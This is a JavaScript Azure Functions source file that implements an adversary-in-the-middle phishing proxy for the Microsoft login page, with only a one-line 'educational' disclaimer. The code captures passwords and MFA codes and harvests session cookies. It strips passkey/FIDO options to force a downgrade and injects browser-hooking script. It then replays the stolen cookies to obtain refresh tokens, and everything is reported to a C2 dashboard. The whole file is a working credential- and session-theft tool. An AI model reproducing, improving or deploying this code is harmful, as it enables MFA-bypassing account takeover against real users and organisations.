/**
 * Microsoft AiTM Proxy — Transparent proxy to login.microsoftonline.com
 *
 * Proxies the entire Microsoft login flow including credential entry, 2FA,
 * and session cookie issuance. Captures credentials on POST and monitors
 * for session cookies (ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie).
 *
 * Uses a server-side cookie jar per victim session so cookie forwarding to
 * Microsoft does not depend on the browser at all (avoids domain, SameSite,
 * Secure, and header-serialization issues).
 *
 * Integrates with dashboard.js for real-time C2 session management.
 *
 * This code is provided for educational/research purposes only.
 */

const { app } = require("@azure/functions");
const crypto = require("crypto");
const { Axios } = require("axios");
const { pushNotification, sessions } = require("./dashboard");

const upstream = "login.microsoftonline.com";
const upstream_path = "/";

const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
  "transfer-encoding",
];

function esc(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }

function supersedeStale(activeSessionId, upn, context) {
  if (!upn || upn === "unknown") return;
  const upnLower = upn.toLowerCase();
  for (const [sid, s] of sessions) {
    if (sid !== activeSessionId && s.user?.upn?.toLowerCase() === upnLower && !s.refreshToken && s.status !== "superseded") {
      s.status = "superseded";
      context.log(`Superseded stale session ${sid} for ${upn}`);
    }
  }
}

const capturedSessions = new Set();
const executedSessions = new Set();

const cookieJars = new Map();
const SESSION_COOKIE_NAME = "__proxy_sid";

setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  for (const [id, session] of cookieJars) {
    if (session.lastSeen < cutoff) cookieJars.delete(id);
  }
}, 60_000);

function getOrCreateSession(request) {
  const cookies = request.headers.get("cookie") || "";
  const match = cookies.match(new RegExp(`${SESSION_COOKIE_NAME}=([^;]+)`));
  let sessionId = match ? match[1] : null;
  let isNew = false;

  if (!sessionId || !cookieJars.has(sessionId)) {
    sessionId = crypto.randomUUID();
    cookieJars.set(sessionId, { cookies: new Map(), lastSeen: Date.now(), credentials: {} });
    isNew = true;
  } else {
    cookieJars.get(sessionId).lastSeen = Date.now();
  }

  return { sessionId, isNew };
}

function updateJar(sessionId, setCookieHeaders) {
  const session = cookieJars.get(sessionId);
  if (!session) return;

  for (const header of setCookieHeaders) {
    const nameValue = header.split(";")[0];
    const eqIndex = nameValue.indexOf("=");
    if (eqIndex < 0) continue;
    const name = nameValue.substring(0, eqIndex).trim();
    const value = nameValue.substring(eqIndex + 1);

    const isExpired = /expires\s*=\s*Thu,\s*01[\s-]Jan[\s-]1970/i.test(header);
    const maxAgeZero = /max-age\s*=\s*0/i.test(header);

    if (!value || isExpired || maxAgeZero) {
      session.cookies.delete(name);
    } else {
      session.cookies.set(name, value);
    }
  }
}

function getJarCookieHeader(sessionId) {
  const session = cookieJars.get(sessionId);
  if (!session || session.cookies.size === 0) return "";
  return Array.from(session.cookies.entries())
    .map(([k, v]) => `${k}=${v}`)
    .join("; ");
}

function sessionTrackingCookie(sessionId, isSecure) {
  return `${SESSION_COOKIE_NAME}=${sessionId}; path=/; HttpOnly; SameSite=Lax${isSecure ? "; Secure" : ""}`;
}

function rewriteBody(text, upstreamHost, proxyOrigin) {
  let result = text;
  const proxyHost = proxyOrigin.replace(/^https?:\/\//, "");

  result = result.replace(
    new RegExp(`https://${escapeRegex(upstreamHost)}`, "g"),
    proxyOrigin
  );

  result = result.replace(
    new RegExp(`//${escapeRegex(upstreamHost)}`, "g"),
    proxyOrigin.replace(/^https?:/, "")
  );

  result = result.replace(
    new RegExp(`https:\\\\u002f\\\\u002f${escapeRegex(upstreamHost)}`, "g"),
    proxyOrigin.replace(/\//g, "\\u002f").replace(":", ":")
  );

  result = result.replace(
    new RegExp(`"${escapeRegex(upstreamHost)}"`, "g"),
    `"${proxyHost}"`
  );

  result = result.replace(
    new RegExp(escapeRegex(upstreamHost) + "%2[fF]", "g"),
    proxyHost + "%2F"
  );

  result = result.replace(/https:\/\/login\.microsoft\.com/g, proxyOrigin);
  result = result.replace(/\/\/login\.microsoft\.com/g, proxyOrigin.replace(/^https?:/, ""));

  result = result.replace(/\s+integrity="[^"]*"/g, "");
  result = result.replace(/\s+integrity='[^']*'/g, "");

  result = result.replace(/\s+crossorigin="[^"]*"/g, "");
  result = result.replace(/\s+crossorigin='[^']*'/g, "");
  result = result.replace(/\s+crossorigin(?=[\s>])/g, "");

  return result;
}

function reverseRewriteBody(text, upstreamHost, proxyOrigin) {
  const proxyHost = proxyOrigin.replace(/^https?:\/\//, "");
  let result = text;

  result = result.replace(new RegExp(escapeRegex(proxyOrigin), "g"), `https://${upstreamHost}`);
  result = result.replace(new RegExp(escapeRegex(proxyHost), "g"), upstreamHost);

  result = result.replace(
    new RegExp(escapeRegex(encodeURIComponent(proxyOrigin)), "g"),
    encodeURIComponent(`https://${upstreamHost}`)
  );
  result = result.replace(
    new RegExp(escapeRegex(proxyHost) + "%2[fF]", "g"),
    upstreamHost + "%2F"
  );

  return result;
}

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function processCookies(originalCookies, upstreamHost, proxyHost, isSecure) {
  const processed = [];

  for (const cookie of originalCookies) {
    let modified = cookie;

    modified = modified.replace(/;\s*domain=[^;]+/gi, "");
    modified = modified.replace(/;\s*path=[^;]+/gi, "; path=/");

    if (!/;\s*path\s*=/i.test(modified)) {
      modified += "; path=/";
    }

    if (/samesite\s*=\s*none/i.test(modified)) {
      modified = modified.replace(/;\s*samesite\s*=\s*none/gi, "; SameSite=Lax");
    }

    if (!isSecure) {
      modified = modified.replace(/;\s*secure/gi, "");
    }

    processed.push(modified);
  }

  return processed;
}

function extractCredentials(body) {
  const pairs = body.split("&");
  const result = {};

  for (const pair of pairs) {
    const [key, ...valueParts] = pair.split("=");
    const value = decodeURIComponent(valueParts.join("=").replace(/\+/g, " "));

    if (key === "login" || key === "loginfmt") {
      result.username = value;
    } else if (key === "passwd") {
      result.password = value;
    } else if (key === "otc" || key === "otCode") {
      result.mfaCode = value;
    }
  }

  return result;
}

function getInjectionScript(proxyOrigin) {
  const isSecureProxy = proxyOrigin.startsWith("https:");
  return `
<script>
(function(){
  var P="${proxyOrigin}";
  var U="login.microsoftonline.com";
  var U2="login.microsoft.com";
  var IS=${isSecureProxy};

  function rw(u){
    if(!u||typeof u!=="string")return u;
    u=u.replace(new RegExp("https://"+U,"g"),P);
    u=u.replace(new RegExp("https://"+U2,"g"),P);
    u=u.replace(new RegExp("//"+U,"g"),P.replace(/^https?:/,""));
    u=u.replace(new RegExp("//"+U2,"g"),P.replace(/^https?:/,""));
    return u;
  }

  var cd=Object.getOwnPropertyDescriptor(Document.prototype,'cookie')||
         Object.getOwnPropertyDescriptor(HTMLDocument.prototype,'cookie');
  if(cd&&cd.set){
    Object.defineProperty(document,'cookie',{
      get:function(){return cd.get.call(document);},
      set:function(v){
        v=v.replace(/;\\s*domain=[^;]*/gi,'');
        v=v.replace(/;\\s*path=[^;]*/gi,'; path=/');
        if(!IS) v=v.replace(/;\\s*secure/gi,'');
        if(/samesite\\s*=\\s*none/i.test(v)){
          v=v.replace(/;\\s*samesite\\s*=\\s*none/gi,'; SameSite=Lax');
        }
        return cd.set.call(document,v);
      }
    });
  }

  // Neutralize WebAuthn/passkeys — FIDO is stripped server-side from
  // GetCredentialType responses; this blocks the browser APIs as a safety net.
  delete window.PublicKeyCredential;
  if(navigator.credentials){
    navigator.credentials.get=function(opts){
      if(opts&&opts.publicKey)return new Promise(function(){});
      return Promise.reject(new DOMException("Not supported","NotSupportedError"));
    };
    navigator.credentials.create=function(opts){
      if(opts&&opts.publicKey)return new Promise(function(){});
      return Promise.reject(new DOMException("Not supported","NotSupportedError"));
    };
  }

  var _fetch=window.fetch;
  window.fetch=function(url,opts){
    if(typeof url==="string")url=rw(url);
    else if(url&&url.url)url=new Request(rw(url.url),url);
    return _fetch.call(this,url,opts);
  };

  var _open=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){
    arguments[1]=rw(u);
    return _open.apply(this,arguments);
  };

  var _assign=window.location.assign;
  var _replace=window.location.replace;
  if(_assign)window.location.assign=function(u){return _assign.call(window.location,rw(u));};
  if(_replace)window.location.replace=function(u){return _replace.call(window.location,rw(u));};

  var _wopen=window.open;
  window.open=function(u,n,f){return _wopen.call(window,rw(u),n,f);};

  document.addEventListener("submit",function(e){
    var f=e.target;
    if(f&&f.action&&typeof f.action==="string"){
      f.action=rw(f.action);
    }
  },true);

  var obs=new MutationObserver(function(muts){
    muts.forEach(function(m){
      m.addedNodes.forEach(function(n){
        if(n.nodeType!==1)return;
        if(n.src&&n.src.includes(U))n.src=rw(n.src);
        if(n.href&&n.href.includes(U))n.href=rw(n.href);
        if(n.action&&n.action.includes(U))n.action=rw(n.action);
        n.querySelectorAll&&n.querySelectorAll("[src],[href],[action]").forEach(function(el){
          if(el.src&&el.src.includes(U))el.src=rw(el.src);
          if(el.href&&el.href.includes(U))el.href=rw(el.href);
          if(el.action&&el.action.includes(U))el.action=rw(el.action);
        });
      });
    });
  });
  obs.observe(document.documentElement,{childList:true,subtree:true});
})();
</script>`;
}

// GET,POST /{*x} — Transparent proxy catch-all
app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {
    const original_url = new URL(request.url);
    const upstream_url = new URL(request.url);
    const proxyOrigin = `${original_url.protocol}//${original_url.host}`;
    const isSecure = original_url.protocol === "https:";

    const { sessionId, isNew } = getOrCreateSession(request);
    if (isNew) {
      const ip = request.headers.get("x-forwarded-for") || "unknown";
      const ua = request.headers.get("user-agent") || "unknown";
      context.log(`New proxy session: ${sessionId} | IP: ${ip} | UA: ${ua}`);
      pushNotification("info", `<b>New Session</b><br><b>IP:</b> ${ip}<br><b>UA:</b> ${ua}`, { sessionId });
    }

    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    if (upstream_url.pathname === "/") {
      upstream_url.pathname = upstream_path;
    } else {
      upstream_url.pathname = upstream_path + upstream_url.pathname;
    }

    upstream_url.pathname = upstream_url.pathname.replace(/\/\//g, "/");

    context.log(`Proxying ${request.method}: ${original_url.pathname} -> ${upstream_url.href}`);

    // Enhanced logging for MFA flow debugging
    if (original_url.pathname.includes("/SAS/") || original_url.pathname.includes("/GetCredentialType") || original_url.pathname.includes("/nativeclient") || original_url.pathname.includes("/kmsi")) {
      context.log(`=== AUTH FLOW REQUEST === ${request.method} ${original_url.pathname}`);
    }

    if (original_url.pathname.includes("/oauth2/nativeclient") || original_url.pathname.includes("/oauth/nativeclient")) {
      context.log(`=== NATIVECLIENT HIT === params: code=${original_url.searchParams.has("code")} error=${original_url.searchParams.get("error") || "none"}`);
      const authCode = original_url.searchParams.get("code");
      const authError = original_url.searchParams.get("error");

      if (authCode) {
        context.log("=== AUTH CODE CAPTURED ===");
        context.log("Code:", authCode);
        pushNotification("auth_code", `<b>AUTH CODE CAPTURED</b><br><b>Code:</b> <code>${authCode}</code>`, { sessionId });

        try {
          const tokenResp = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/token", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({
              client_id: CLIENT_ID,
              grant_type: "authorization_code",
              code: authCode,
              redirect_uri: REDIRECT_URI,
              scope: "openid profile offline_access https://graph.microsoft.com/.default",
            }).toString(),
          });
          const tokens = await tokenResp.json();

          if (tokens.access_token) {
            context.log("=== TOKENS FROM AUTH CODE ===");
            context.log("Access Token:", tokens.access_token);
            context.log("Refresh Token:", tokens.refresh_token ? "present" : "none");

            let userInfo = "unknown";
            let userClaims = {};
            if (tokens.id_token) {
              try {
                userClaims = JSON.parse(
                  Buffer.from(tokens.id_token.split(".")[1], "base64url").toString("utf-8")
                );
                userInfo = userClaims.preferred_username || userClaims.upn || userClaims.email || "unknown";
                context.log("User:", userInfo);
                context.log("Tenant:", userClaims.tid || "unknown");
              } catch (e) {}
            }

            pushNotification("tokens",
              `<b>TOKENS CAPTURED (Auth Code Exchange)</b><br>` +
              `<b>User:</b> ${userInfo}<br>` +
              `<b>Access Token:</b> <code>${tokens.access_token}</code><br>` +
              `<b>Refresh Token:</b> ${tokens.refresh_token ? "present" : "none"}<br>` +
              `<b>Scopes:</b> ${tokens.scope || "N/A"}`,
              { user: userInfo, sessionId }
            );

            // Update existing hooked session or create one
            // Reverse so we prefer the most-recently-created session for this user
            const jar = cookieJars.get(sessionId);
            const existing = Array.from(sessions.values()).reverse().find(s =>
              s.cookieArray && jar && s.credentials?.username === jar.credentials?.username && s.credentials?.username
            );
            if (existing) {
              existing.refreshToken = tokens.refresh_token || existing.refreshToken;
              existing.lastTokenRefresh = Date.now();
              existing.user = {
                upn: userInfo,
                name: userClaims.name || existing.user.name,
                tid: userClaims.tid || existing.user.tid,
                jobTitle: userClaims.jobTitle || null,
                department: userClaims.department || null,
              };
              context.log(`Updated existing session ${existing.id} with auth code tokens`);
              supersedeStale(existing.id, userInfo, context);
            } else {
              const hookSessionId = crypto.randomUUID();
              sessions.set(hookSessionId, {
                id: hookSessionId,
                capturedAt: Date.now(),
                lastTokenRefresh: Date.now(),
                status: "active",
                user: {
                  upn: userInfo,
                  name: userClaims.name || "unknown",
                  tid: userClaims.tid || "unknown",
                  jobTitle: userClaims.jobTitle || null,
                  department: userClaims.department || null,
                },
                refreshToken: tokens.refresh_token || null,
                clientId: CLIENT_ID,
                resources: {},
                recon: {},
                credentials: jar?.credentials || {},
                cookieArray: jar ? Array.from(jar.cookies.entries()).map(([k, v]) => `${k}=${v}`) : [],
              });
              pushNotification("execution",
                `<b>SESSION HOOKED</b><br><b>User:</b> ${userInfo}<br><b>Session:</b> ${hookSessionId}`,
                { user: userInfo }
              );
              supersedeStale(hookSessionId, userInfo, context);
            }
          } else if (tokens.error) {
            context.log("Token exchange error:", tokens.error, tokens.error_description);
          }
        } catch (err) {
          context.log("Token exchange failed:", err.message);
        }
      }

      if (authError) {
        context.log("Auth error at nativeclient:", authError);
      }

      triggerExecution(sessionId, context);

      const completionHtml = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Sign in</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2);text-align:center}
.logo{width:108px;margin-bottom:16px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px}
p{color:#1b1b1b;font-size:15px;line-height:1.5}
</style></head>
<body><div class="card">
<img class="logo" src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
<h1>You're signed in</h1>
<p>You can close this window and return to your application.</p>
</div></body></html>`;

      return new Response(completionHtml, {
        status: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }

    // Credential capture on POST
    let requestBody = null;
    if (request.method === "POST") {
      const cloned = request.clone();
      requestBody = await cloned.text();

      const creds = extractCredentials(requestBody);

      if (creds.username && creds.password) {
        context.log("=== CREDENTIALS CAPTURED ===");
        context.log("Username:", creds.username);
        context.log("Password:", creds.password);
        const jar = cookieJars.get(sessionId);
        if (jar) { jar.credentials.username = creds.username; jar.credentials.password = creds.password; }
        pushNotification("credentials",
          `<b>CREDENTIALS CAPTURED</b><br><b>Username:</b> ${esc(creds.username)}<br><b>Password:</b> ${esc(creds.password)}`,
          { user: creds.username, sessionId }
        );
      }

      if (creds.mfaCode) {
        context.log("=== MFA CODE CAPTURED ===");
        context.log("Code:", creds.mfaCode);
        const jar = cookieJars.get(sessionId);
        if (jar) {
          jar.credentials.mfaCode = creds.mfaCode;
          if (creds.username && !jar.credentials.username) jar.credentials.username = creds.username;
        }
        pushNotification("mfa",
          `<b>MFA CODE CAPTURED</b><br><b>Code:</b> ${creds.mfaCode}<br><b>User:</b> ${creds.username || "unknown"}`,
          { user: creds.username || "unknown", sessionId }
        );
      }

      requestBody = reverseRewriteBody(requestBody, upstream, proxyOrigin);
    }

    // Build upstream request
    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");

    const clientReferer = request.headers.get("referer");
    if (clientReferer) {
      new_request_headers.set("Referer", clientReferer.replace(proxyOrigin, `https://${upstream}`));
    } else {
      new_request_headers.set("Referer", `https://${upstream}/`);
    }
    new_request_headers.set("Origin", `https://${upstream}`);

    const jarCookies = getJarCookieHeader(sessionId);
    if (jarCookies) {
      new_request_headers.set("Cookie", jarCookies);
      context.log(`Forwarding ${cookieJars.get(sessionId)?.cookies.size || 0} jar cookies for ${original_url.pathname}`);
    } else {
      context.log(`No jar cookies yet, forwarding browser cookies for ${original_url.pathname}`);
    }

    const cookieHeader = new_request_headers.get("Cookie") || "";
    if (cookieHeader.includes(SESSION_COOKIE_NAME)) {
      const cleaned = cookieHeader
        .split(";")
        .map(c => c.trim())
        .filter(c => !c.startsWith(SESSION_COOKIE_NAME + "="))
        .join("; ");
      new_request_headers.set("Cookie", cleaned);
    }

    const clientUA = request.headers.get("user-agent") || "";
    if (!clientUA) {
      new_request_headers.set("user-agent",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
      );
    }

    const fetchOpts = {
      method: request.method,
      headers: new_request_headers,
      redirect: "manual",
    };

    if (request.method === "POST") {
      fetchOpts.body = requestBody || request.body;
      fetchOpts.duplex = "half";
    }

    let original_response;
    try {
      original_response = await fetch(upstream_url.href, fetchOpts);
    } catch (err) {
      context.log(`Upstream fetch error: ${err.message}`);
      return new Response("Service temporarily unavailable", { status: 502 });
    }

    if (request.headers.get("Upgrade")?.toLowerCase() === "websocket") {
      return original_response;
    }

    const upstreamSetCookies = original_response.headers.getSetCookie?.() || [];
    if (upstreamSetCookies.length > 0) {
      updateJar(sessionId, upstreamSetCookies);
      context.log(`Jar updated: +${upstreamSetCookies.length} cookies (${original_url.pathname}) — jar now has ${cookieJars.get(sessionId)?.cookies.size || 0} cookies`);
    }

    checkSessionCookies(upstreamSetCookies, sessionId, context);
    triggerExecution(sessionId, context);

    // Handle redirects
    if (original_response.status >= 300 && original_response.status < 400) {
      const location = original_response.headers.get("Location");
      if (location) {
        const rewrittenLocation = rewriteBody(location, upstream, proxyOrigin);
        context.log(`Redirect: ${location} -> ${rewrittenLocation}`);

        const redirectHeaders = new Headers();

        const processedRedirectCookies = processCookies(upstreamSetCookies, upstream, original_url.host, isSecure);
        for (const c of processedRedirectCookies) {
          redirectHeaders.append("Set-Cookie", c);
        }
        redirectHeaders.append("Set-Cookie", sessionTrackingCookie(sessionId, isSecure));

        redirectHeaders.set("Location", rewrittenLocation);
        redirectHeaders.set("Cache-Control", "no-cache, no-store, must-revalidate");

        return new Response(null, {
          status: original_response.status,
          headers: redirectHeaders,
        });
      }
    }

    // Process response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((h) => new_response_headers.delete(h));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", "true");

    const processedCookies = processCookies(upstreamSetCookies, upstream, original_url.host, isSecure);
    for (const cookie of processedCookies) {
      new_response_headers.append("Set-Cookie", cookie);
    }
    new_response_headers.append("Set-Cookie", sessionTrackingCookie(sessionId, isSecure));

    // Rewrite response body
    const contentType = original_response.headers.get("content-type") || "";

    if (contentType.includes("text/") || contentType.includes("javascript") ||
        contentType.includes("json") || contentType.includes("xml")) {

      let body = await original_response.text();
      body = rewriteBody(body, upstream, proxyOrigin);

      // Strip FIDO/passkey from GetCredentialType API responses
      if (contentType.includes("json") && original_url.pathname.includes("GetCredentialType")) {
        try {
          const credObj = JSON.parse(body);
          if (credObj.Credentials) {
            delete credObj.Credentials.FidoParams;
            credObj.Credentials.HasFido = false;
            delete credObj.Credentials.RemoteNgcParams;
          }
          if ("IsFidoSupported" in credObj) credObj.IsFidoSupported = false;
          body = JSON.stringify(credObj);
          context.log("Stripped FIDO from GetCredentialType response");
        } catch (e) {}
      }

      if (contentType.includes("text/html")) {
        // Strip FIDO/passkey references from inline $Config
        body = body.replace(/"IsFidoSupported"\s*:\s*true/g, '"IsFidoSupported":false');
        body = body.replace(/"HasFido"\s*:\s*true/g, '"HasFido":false');
        // FidoParams object has nested braces — don't regex it; HasFido:false is sufficient
        body = body.replace(/"isFidoSupported"\s*:\s*true/gi, '"isFidoSupported":false');

        const injectionScript = getInjectionScript(proxyOrigin);
        if (body.includes("<head>")) {
          body = body.replace("<head>", "<head>" + injectionScript);
        } else if (body.includes("<head ")) {
          body = body.replace(/<head\s[^>]*>/, "$&" + injectionScript);
        } else {
          body = injectionScript + body;
        }
      }

      return new Response(body, {
        status: original_response.status,
        headers: new_response_headers,
      });
    }

    return new Response(original_response.body, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});

const CLIENT_ID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264";
const REDIRECT_URI = "https://login.microsoftonline.com/common/oauth2/nativeclient";
const REPLAY_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

async function replaySessionForTokens(cookieArray, context) {
  const authUrl = "https://login.microsoftonline.com/common/oauth2/authorize?" +
    new URLSearchParams({
      response_type: "code",
      client_id: CLIENT_ID,
      resource: "https://graph.microsoft.com/",
      redirect_uri: REDIRECT_URI,
      state: crypto.randomUUID(),
    }).toString();

  const client = new Axios({
    headers: {
      "cookie": cookieArray.join("; "),
      "User-Agent": REPLAY_UA,
    },
    maxRedirects: 10,
  });

  const response = await client.get(authUrl);
  const finalUrl = response.request?._redirectable?._currentUrl || response.request?.res?.responseUrl || "";
  context.log(`Cookie replay final URL: ${finalUrl.substring(0, 200)}`);

  const code = new URLSearchParams(finalUrl.split("?")[1] || "").get("code");
  if (!code) {
    const error = new URLSearchParams(finalUrl.split("?")[1] || "").get("error");
    context.log(`Cookie replay: no auth code — ${error || "redirect did not reach nativeclient"}`);
    return null;
  }

  context.log("Auth code from cookie replay:", code);
  const tokenResp = await fetch("https://login.microsoftonline.com/common/oauth2/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      client_id: CLIENT_ID,
      grant_type: "authorization_code",
      code: code,
      redirect_uri: REDIRECT_URI,
      resource: "https://graph.microsoft.com/",
    }).toString(),
  });
  return tokenResp.json();
}

function triggerExecution(sessionId, context) {
  if (executedSessions.has(sessionId)) return;
  const jar = cookieJars.get(sessionId);
  if (!jar || jar.cookies.size === 0) return;
  if (!jar.cookies.has("ESTSAUTHPERSISTENT")) return;

  executedSessions.add(sessionId);

  const cookieArray = Array.from(jar.cookies.entries()).map(([k, v]) => `${k}=${v}`);
  context.log(`Session ${sessionId}: MS auth complete. ${cookieArray.length} cookies captured.`);

  const msNames = ["ESTSAUTHPERSISTENT", "ESTSAUTH", "SignInStateCookie"];
  const pick = (names) => cookieArray.filter(c => names.some(n => c.startsWith(n + "="))).map(c => `<code>${c}</code>`);

  let html = `<b>FULL SESSION CAPTURED (${cookieArray.length} cookies)</b><br><br>`;
  html += `<b style="color:#39d2c0">Microsoft Session:</b><br>${pick(msNames).join("<br>")}`;
  pushNotification("session_cookies", html, { sessionId });

  const hookSessionId = crypto.randomUUID();
  sessions.set(hookSessionId, {
    id: hookSessionId,
    capturedAt: Date.now(),
    lastTokenRefresh: null,
    status: "active",
    user: { upn: jar.credentials?.username || "unknown", name: "unknown", tid: "unknown" },
    refreshToken: null,
    clientId: CLIENT_ID,
    resources: {},
    recon: {},
    credentials: jar.credentials || {},
    cookieArray: cookieArray,
  });
  pushNotification("execution",
    `<b>SESSION HOOKED</b><br><b>User:</b> ${jar.credentials?.username || "unknown"}<br><b>Session:</b> ${hookSessionId}`,
    { user: jar.credentials?.username || "unknown" }
  );

  // Replay captured cookies server-side to obtain a refresh token
  replaySessionForTokens(cookieArray, context).then(async (tokens) => {
    const s = sessions.get(hookSessionId);
    if (!s) return;
    if (!tokens?.access_token) {
      context.log(`Cookie replay: no tokens obtained — ${tokens?.error || "unknown error"}`);
      if (tokens?.error_description) context.log(`  ${tokens.error_description}`);
      return;
    }

    s.refreshToken = tokens.refresh_token || null;
    s.lastTokenRefresh = Date.now();

    if (tokens.id_token) {
      try {
        const claims = JSON.parse(Buffer.from(tokens.id_token.split(".")[1], "base64url").toString("utf-8"));
        s.user.upn = claims.upn || claims.preferred_username || s.user.upn;
        s.user.name = claims.name || s.user.name;
        s.user.tid = claims.tid || s.user.tid;
      } catch (e) {}
    }

    // Enrich user profile from Graph API
    try {
      const me = await fetch("https://graph.microsoft.com/v1.0/me", {
        headers: { "Authorization": "Bearer " + tokens.access_token, "User-Agent": REPLAY_UA },
      }).then(r => r.json());

      if (me.userPrincipalName) {
        s.user.upn = me.userPrincipalName;
        s.user.name = me.displayName || s.user.name;
        s.user.jobTitle = me.jobTitle || null;
        s.user.department = me.department || null;
        s.user.tid = me.tid || s.user.tid;
        context.log(`User enriched: ${me.displayName} (${me.userPrincipalName})`);
      }
    } catch (e) {
      context.log(`Graph /me enrichment failed: ${e.message}`);
    }

    pushNotification("tokens",
      `<b>TOKENS FROM COOKIE REPLAY</b><br><b>User:</b> ${s.user.upn} (${s.user.name})<br><b>Refresh Token:</b> ${s.refreshToken ? "present" : "none"}`,
      { user: s.user.upn }
    );
    context.log(`Session ${hookSessionId}: refresh token obtained via cookie replay`);
  }).catch(err => {
    context.log(`Cookie replay failed: ${err.message}`);
  });
}

function checkSessionCookies(cookies, sessionId, context) {
  const sessionCookieNames = ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"];
  const found = [];

  for (const cookie of cookies) {
    for (const name of sessionCookieNames) {
      if (cookie.startsWith(`${name}=`) && !cookie.includes(`${name}=;`)) {
        found.push(name);
      }
    }
  }

  if (found.length >= 2) {
    const sig = cookies.map(c => c.substring(0, 30)).join("|");
    if (capturedSessions.has(sig)) return;
    capturedSessions.add(sig);

    context.log("=== SESSION COOKIES CAPTURED ===");
    context.log("Cookies:", found.join(", "));

    const cookieValues = cookies
      .filter(c => sessionCookieNames.some(n => c.startsWith(`${n}=`)))
      .map(c => c.split(";")[0]);

    pushNotification("session_cookies",
      `<b>SESSION COOKIES CAPTURED</b><br><b>Cookies:</b> ${found.join(", ")}<br><br><code>${cookieValues.join("\n")}</code>`,
      { sessionId }
    );

    triggerExecution(sessionId, context);
  }
}
